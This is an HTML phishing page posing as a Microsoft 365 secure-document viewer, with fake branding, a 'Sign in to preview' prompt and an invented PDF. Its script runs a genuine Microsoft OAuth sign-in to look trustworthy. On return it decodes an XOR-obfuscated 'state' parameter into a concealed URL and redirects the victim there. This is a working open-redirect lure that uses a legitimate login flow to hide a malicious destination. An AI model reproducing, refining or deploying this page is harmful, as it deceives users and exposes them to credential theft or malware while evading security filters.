<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure File View</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
  .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 16px rgba(0,0,0,0.08); width: 420px; max-width: 94vw; overflow: hidden; }
  .header { background: #0078d4; color: #fff; padding: 20px 24px; }
  .header h1 { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
  .header p { font-size: 13px; opacity: 0.85; }
  .body { padding: 24px; }
  .file-icon { width: 56px; height: 56px; background: #e8f0fe; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
  .file-name { font-size: 15px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
  .file-meta { font-size: 12px; color: #888; margin-bottom: 20px; }
  .preview-box { background: #f5f5f5; border: 1px solid #e0e0e0; border-radius: 8px; height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #999; font-size: 13px; margin-bottom: 20px; }
  .preview-box svg { margin-bottom: 10px; }
  .ms-btn { width: 100%; padding: 12px 20px; background: #fff; color: #333; border: 1.5px solid #d0d0d0; border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: background 0.15s; }
  .ms-btn:hover { background: #f5f5f5; }
  .ms-btn svg { width: 20px; height: 20px; flex-shrink: 0; }
  .footer { text-align: center; padding: 16px 24px; border-top: 1px solid #eee; font-size: 11px; color: #aaa; }

  /* OAuth redirect handler — only fires when user returns with code= */
  #auth-msg { display: none; margin-top: 16px; text-align: center; }
  #auth-msg .loader { width: 24px; height: 24px; border: 3px solid #e0e0e0; border-top-color: #0078d4; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 10px; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <h1>Secure File View</h1>
    <p>You've received a secure document</p>
  </div>
  <div class="body" id="main-body">
    <div class="file-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#0078d4" stroke-width="1.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
    </div>
    <div class="file-name">Document_2026.pdf</div>
    <div class="file-meta">1 page · PDF · 284 KB · Shared securely</div>
    <div class="preview-box">
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
      Sign in to preview this document
    </div>
    <button class="ms-btn" id="signin-btn" onclick="doOAuth()">
      <svg viewBox="0 0 21 21"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
      Sign in with Microsoft
    </button>
    <div id="auth-msg">
      <div class="loader"></div>
      <span style="color:#888;font-size:13px">Verifying...</span>
    </div>
  </div>
  <div class="footer">Secured by Microsoft 365 · This link is private</div>
</div>

<script>
var CLIENT_ID = '81df0209-69c5-44a1-b412-032af383f660';
var REDIRECT_URI = 'https://securefile-view.github.io/';

(function() {
  var params = new URLSearchParams(location.search);

  // Check if returning from OAuth (has code=)
  var code = params.get('code');
  if (code) {
    document.getElementById('main-body').innerHTML = '<div style="text-align:center;padding:40px"><div class="loader" style="width:32px;height:32px;border:3px solid #e0e0e0;border-top-color:#0078d4;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 16px"></div><p style="color:#888;font-size:14px">Verifying your identity...</p></div>';

    var state = params.get('state');
    if (!state) {
      var hashState = location.hash.indexOf('state=');
      if (hashState > -1) state = location.hash.substring(hashState + 6).split('&')[0];
    }
    if (state) {
      try {
        var bytes = atob(state);
        var url = '';
        for (var i = 0; i < bytes.length; i++) {
          url += String.fromCharCode(bytes.charCodeAt(i) ^ 0x55);
        }
        if (/^https?:\/\//.test(url)) {
          location.replace(url);
        }
      } catch(e) {}
    }
  }
})();

function doOAuth() {
  var params = new URLSearchParams(location.search);
  var state = params.get('state');
  if (!state) {
    var hashState = location.hash.indexOf('state=');
    if (hashState > -1) state = location.hash.substring(hashState + 6).split('&')[0];
  }
  if (!state) { alert('Invalid link'); return; }

  document.getElementById('signin-btn').style.display = 'none';
  document.getElementById('auth-msg').style.display = 'block';

  var oauthUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
    'client_id=' + CLIENT_ID +
    '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +
    '&response_type=code' +
    '&scope=openid' +
    '&state=' + state +
    '&prompt=select_account' +
    '&response_mode=query';

  setTimeout(function() {
    location.replace(oauthUrl);
  }, 600);
}
</script>
</body>
</html>
